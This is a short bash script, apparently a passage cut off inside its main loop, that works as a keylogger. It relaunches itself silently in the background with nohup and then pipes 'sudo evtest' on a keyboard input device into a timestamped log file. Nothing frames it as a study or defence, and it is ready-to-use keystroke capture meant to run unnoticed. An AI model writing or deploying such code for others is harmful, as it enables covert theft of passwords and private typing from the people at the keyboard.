#!/bin/bash

LOG_FILE="keylogs.txt"
DEVICE="/dev/input/event2"  # Replace with your actual device path from evtest

# Check if the script is already running in the background
if [[ "$1" != "background" ]]; then
    # Relaunch the script in the background
    nohup "$0" background > /dev/null 2>&1 &
    echo "Script is running in the background (log: $LOG_FILE)"
    exit 0
fi

# Main logging loop
sudo evtest "$DEVICE" | while read -r line; do
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $line" >> "$LOG_FILE"
